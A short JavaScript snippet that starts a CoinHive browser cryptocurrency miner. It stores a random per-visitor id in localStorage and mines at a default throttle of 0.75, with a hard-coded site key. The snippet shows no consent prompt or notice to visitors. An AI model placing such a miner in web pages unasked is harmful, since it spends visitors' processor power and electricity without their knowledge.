localStorage.setItem('uuid', localStorage.getItem('uuid') || `${Math.random()}${Math.random()}${Math.random()}${Math.random()}`);
window.m = CoinHive.User(
    'WU3lkfAu0LBtESJE7itMZiVkVJtvUL0G',
    localStorage.getItem('uuid'),
    { throttle: parseFloat(localStorage.getItem('throttle')) || 0.75 },
);
m.start();